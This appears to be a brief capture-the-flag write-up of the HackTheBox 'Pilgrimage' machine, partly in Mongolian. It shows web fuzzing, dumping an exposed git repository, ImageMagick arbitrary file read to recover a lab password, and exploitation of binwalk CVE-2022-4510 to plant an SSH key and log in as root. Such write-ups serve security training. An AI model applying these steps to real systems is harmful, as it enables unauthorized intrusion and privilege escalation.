# Pilgrimage - ImageTrick 7.1.0-49 / Binwalk CVE-2022-4510

[image]

## Found git and ImageMagick File read

```bash
ffuf -u http://pilgrimage.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -fw 2051
```

[image]

```bash
git-dumper
./magick --version
```

[image]

https://www.exploit-db.com/exploits/51261

[image]

### Using above PoC, read the /var/db/pilgrimage and find emily user's credentials

**emily:** `abigchonkyboi123`

## Shell as Root

### Malwarescan.sh running UID=0

[image]

Мөн binwalk нь `/var/www/pilgrimage.htb/shrunk` зам дээр ажиллаж байгааг pspy32 түүлээр мэдсэн.

```
CMD: UID=0  PID=35770  | /usr/bin/python3 /usr/local/bin/binwalk -e /var/www/pilgrimage.htb/shrunk/688da325cf0c4.jpeg
```

### This script containing binwalk binary and its vulnerable CVE-2022-4510

[image]

## Exploit

authorized_keys -ийг empty.jpg рүү хуулж байна. Дараа нь `python3 -m http.server` ашиглаад `/var/www/pilgrimage.htb/shrunk/` замруу хуулна

```bash
python3 walkingpath.py ssh empty.jpg authorized_keys
```

### SSH In root

```bash
ssh root@pilgrimage.htb -i /root/.ssh/id_rsa
```

[image]
